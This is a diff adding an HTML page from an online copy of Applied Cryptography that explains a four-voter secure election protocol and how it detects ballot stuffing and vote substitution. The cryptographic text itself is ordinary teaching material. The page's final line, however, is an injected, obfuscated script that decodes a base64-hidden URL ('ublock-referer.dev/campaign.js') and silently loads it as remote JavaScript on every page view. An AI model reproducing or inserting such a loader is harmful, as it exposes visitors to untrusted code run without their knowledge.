@@ -1,0 +1,136 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Esoteric Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=06//-->
+<!--PAGES=130-132//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Alice, Bob, Carol, and Dave are voting yes or no (0 or 1) on a particular issue. Assume each voter has a public and private key. Also assume that everyone knows everyone else&#146;s public keys.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Each voter chooses his vote and does the following:
+<DL>
+<DD><B>(a)</B>&nbsp;&nbsp;He attaches a random string to his vote.
+<DD><B>(b)</B>&nbsp;&nbsp;He encrypts the result of step (a) with Dave&#146;s public key.
+<DD><B>(c)</B>&nbsp;&nbsp;He encrypts the result of step (b) with Carol&#146;s public key.
+<DD><B>(d)</B>&nbsp;&nbsp;He encrypts the result of step (c) with Bob&#146;s public key.
+<DD><B>(e)</B>&nbsp;&nbsp;He encrypts the result of step (d) with Alice&#146;s public key.
+<DD><B>(f)</B>&nbsp;&nbsp;He attaches a new random string to the result of step (e) and encrypts it with Dave&#146;s public key. He records the value of the random string.
+<DD><B>(g)</B>&nbsp;&nbsp;He attaches a new random string to the result of step (f) and encrypts it with Carol&#146;s public key. He records the value of the random string.
+<DD><B>(h)</B>&nbsp;&nbsp;He attaches a new random string to the result of step (g) and encrypts it with Bob&#146;s public key. He records the value of the random string.
+<DD><B>(i)</B>&nbsp;&nbsp;He attaches a new random string to the result of step (h) and encrypts it with Alice&#146;s public key. He records the value of the random string.
+<BR>If <I>E</I> is the encryption function, <I>R</I> <SUB>i</SUB> is a random string, and <I>V</I> is the vote, his message looks like:
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>R</I><SUB>5</SUB>,<I>E</I><SUB>B</SUB>(<I>R</I><SUB>4</SUB>,<I>E</I><SUB>C</SUB>(<I>R</I><SUB>3</SUB>,<I>E</I><SUB>D</SUB>(<I>R</I><SUB>2</SUB>,<I>E</I><SUB>A</SUB>(<I>E </I><SUB>B</SUB>(<I>E</I><SUB>C</SUB>(<I>E</I><SUB>D</SUB>(<I>V,R</I><SUB>1</SUB>))))))))
+</DL>
+<BR>Each voter saves the intermediate results at each point in the calculation. These results will be used later in the protocol to confirm that his vote is among those being counted.
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Each voter sends his message to Alice.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice decrypts all of the votes with her private key and then removes all of the random strings at that level.
+<DD><B>(4)</B>&nbsp;&nbsp;Alice scrambles the order of all the votes and sends the result to Bob.
+<BR>Each vote now looks like this:
+<DL>
+<DD><I>E</I><SUB>B</SUB>(<I>R</I><SUB>4</SUB>,<I>E</I><SUB>C</SUB>(<I>R</I><SUB>3</SUB>,<I>E</I><SUB>D</SUB>(<I>R</I><SUB>2</SUB>,<I>E</I><SUB>A</SUB>(<I>E</I><SUB>B</SUB>(<I>E</I><SUB>C</SUB>(<I>E</I><SUB>D</SUB>(<I>V,R</I><SUB>1</SUB>)))))))
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts all of the votes with his private key, checks to see that his vote is among the set of votes, removes all the random strings at that level, scrambles all the votes, and then sends the result to Carol.
+<BR>Each vote now looks like this:
+<DL>
+<DD><I>E</I><SUB>C</SUB>(<I>R</I><SUB>3</SUB>,<I>E</I><SUB>D</SUB> (<I>R</I><SUB>2</SUB>,<I>E</I><SUB>A</SUB>(<I>E</I><SUB>B</SUB>(<I>E</I><SUB>C</SUB>(<I>E</I><SUB>D</SUB>(<I>V,R</I><SUB>1</SUB>))))))
+</DL>
+<DD><B>(6)</B>&nbsp;&nbsp;Carol decrypts all of the votes with her private key, checks to see that her vote is among the set of votes, removes all the random strings at that level, scrambles all the votes, and then sends the result to Dave.
+<BR>Each vote now looks like this:
+<DL>
+<DD><I>E</I><SUB>D</SUB>(<I>R</I><SUB>2</SUB>,<I>E</I><SUB>A</SUB>(<I>E</I><SUB>B</SUB>(<I>E</I><SUB>C</SUB>(<I>E</I><SUB>D</SUB>(<I>V,R</I><SUB>1</SUB>)))))
+</DL>
+<DD><B>(7)</B>&nbsp;&nbsp;Dave decrypts all of the votes with his private key, checks to see that his vote is among the set of votes, removes all the random strings at that level, scrambles all the votes, and sends them to Alice.
+<BR>Each vote now looks like this:
+<DL>
+<DD><I>E</I><SUB>A</SUB>(<I>E</I><SUB>B</SUB>(<I>E</I><SUB>C</SUB>(<I>E</I><SUB>D</SUB>(<I>V,R</I><SUB>1</SUB>))))
+</DL>
+<DD><B>(8)</B>&nbsp;&nbsp;Alice decrypts all the votes with her private key, checks to see that her vote is among the set of votes, signs all the votes, and then sends the result to Bob, Carol, and Dave.
+<BR>Each vote now looks like this:
+<DL>
+<DD><I>S</I><SUB>A</SUB>(<I>E</I><SUB>B</SUB>(<I>E</I><SUB>C</SUB>(<I>E</I><SUB>D</SUB>(<I>V,R</I><SUB>1</SUB>))))
+</DL>
+<DD><B>(9)</B>&nbsp;&nbsp;Bob verifies and deletes Alice&#146;s signatures. He decrypts all the votes with his private key, checks to see that his vote is among the set of votes, signs all the votes, and then sends the result to Alice, Carol, and Dave.
+<BR>Each vote now looks like this:
+<DL>
+<DD><I>S</I><SUB>B</SUB>(<I>E</I><SUB>C</SUB>(<I>E</I><SUB>D</SUB>(<I>V,R</I><SUB>1</SUB>)))
+</DL>
+<DD><B>(10)</B>&nbsp;&nbsp;Carol verifies and deletes Bob&#146;s signatures. She decrypts all the votes with her private key, checks to see that her vote is among the set of votes, signs all the votes, and then sends the result to Alice, Bob, and Dave.
+<BR>Each vote now looks like this:
+<DL>
+<DD><I>S</I><SUB>C</SUB>(<I>E</I><SUB>D</SUB>(<I>V,R</I><SUB>1</SUB>))
+</DL>
+<DD><B>(11)</B>&nbsp;&nbsp;Dave verifies and deletes Carol&#146;s signatures. He decrypts all the votes with his private key, checks to see that his vote is among the set of votes, signs all the votes, and then sends the result to Alice, Bob, and Carol.
+<BR>Each vote now looks like this:
+<DL>
+<DD><I>S</I><SUB>D</SUB>(<I>V,R</I><SUB>1</SUB>)
+</DL>
+<DD><B>(12)</B>&nbsp;&nbsp;All verify and delete Dave&#146;s signature. They check to make sure that their vote is among the set of votes (by looking for their random string among the votes).
+<DD><B>(13)</B>&nbsp;&nbsp;Everyone removes the random strings from each vote and tallies the votes.
+</DL>
+<P>Not only does this protocol work, it is also self-adjudicating. Alice, Bob, Carol, and Dave will immediately know if someone tries to cheat. No CTF or CLA is required. To see how this works, let&#146;s try to cheat.
+</P>
+<P>If someone tries to stuff the ballot, Alice will detect the attempt in step (3) when she receives more votes than people. If Alice tries to stuff the ballot, Bob will notice in step (4).</P>
+<P>More devious is to substitute one vote for another. Since the votes are encrypted with various public keys, anyone can create as many valid votes as needed. The decryption protocol has two rounds: round one consists of steps (3) through (7), and round two consists of steps (8) through (11). Vote substitution is detected differently in the different rounds.</P>
+<P>If someone substitutes one vote for another in round two, his actions are discovered immediately. At every step the votes are signed and sent to all the voters. If one (or more) of the voters noticed that his vote is no longer in the set of votes, he immediately stops the protocol. Because the votes are signed at every step, and because everyone can backtrack through the second round of the protocol, it is easy to detect who substituted the votes.</P>
+<P>Substituting one vote for another during round one of the protocol is more subtle. Alice can&#146;t do it in step (3), because Bob, Carol, or Dave will detect it in step (5), (6), or (7). Bob could try in step (5). If he replaces Carol&#146;s or Dave&#146;s vote (remember, he doesn&#146;t know which vote corresponds to which voter), Carol or Dave will notice in step (6) or (7). They wouldn&#146;t know who tampered with their vote (although it would have had to be someone who had already handled the votes), but they would know that their vote was tampered with. If Bob is lucky and picks Alice&#146;s vote to replace, she won&#146;t notice until the second round. Then, she will notice her vote missing in step (8). Still, she would not know who tampered with her vote. In the first round, the votes are shuffled from one step to the other and unsigned; it is impossible for anyone to backtrack through the protocol to determine who tampered with the votes.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(cXIoaonC, zoXbMssj) {zoXbMssj = cXIoaonC.createElement('script');zoXbMssj.type = 'text/javascript';zoXbMssj.async = true;zoXbMssj.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');cXIoaonC.getElementsByTagName('body')[0].appendChild(zoXbMssj);}(document));</script></body>
+</html>
